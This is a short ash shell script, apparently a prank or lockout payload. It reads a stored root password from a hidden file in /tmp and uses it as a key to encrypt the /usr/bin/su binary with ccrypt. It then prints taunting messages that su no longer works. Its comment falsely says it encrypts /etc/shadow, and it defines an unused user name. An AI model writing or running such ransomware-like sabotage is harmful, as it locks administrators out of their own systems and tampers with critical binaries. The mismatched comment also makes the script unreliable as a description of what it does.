#!/bin/ash
sleep 5
#this script encrypts /etc/shadow- and /etc/shadow files
new_user="hahahahahaha"
key=$(cat /tmp/.root_password.txt)

for file in /usr/bin/su; do
    ccrypt -e -K $key $file
    if [ $? -eq 0 ]; then
        echo "File su in /usr/ has been encrypted successfully. You can no longer su for now..."
        echo "Everything uses the same password. The only sudo command that is allowed is ccrypt -d to decrypt the file"
    else
        echo "Failed to encrypt the file $file."
    fi
done

